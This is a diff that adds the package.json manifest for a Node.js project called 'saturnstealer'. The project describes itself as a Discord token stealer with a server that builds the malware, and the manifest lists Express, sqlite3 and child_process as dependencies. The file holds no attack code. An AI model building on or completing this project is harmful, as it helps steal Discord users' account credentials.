@@ -1,0 +1,30 @@
+{
+  "name": "saturnstealer",
+  "version": "1.0.0",
+  "description": "Discord Token Stealer make Server and build the Malware",
+  "main": "server.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "start": "node server.js"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/Endleph/Saturn-Stealer.git"
+  },
+  "author": "Endleph",
+  "license": "ISC",
+  "bugs": {
+    "url": "https://github.com/Endleph/Saturn-Stealer/issues"
+  },
+  "homepage": "https://github.com/Endleph/Saturn-Stealer#readme",
+  "dependencies": {
+    "body-parser": "^1.19.2",
+    "child_process": "^1.0.2",
+    "cookie-parser": "^1.4.6",
+    "express": "^4.17.3",
+    "frameguard": "^4.0.0",
+    "fs": "0.0.1-security",
+    "http": "0.0.1-security",
+    "sqlite3": "^5.0.2"
+  }
+}
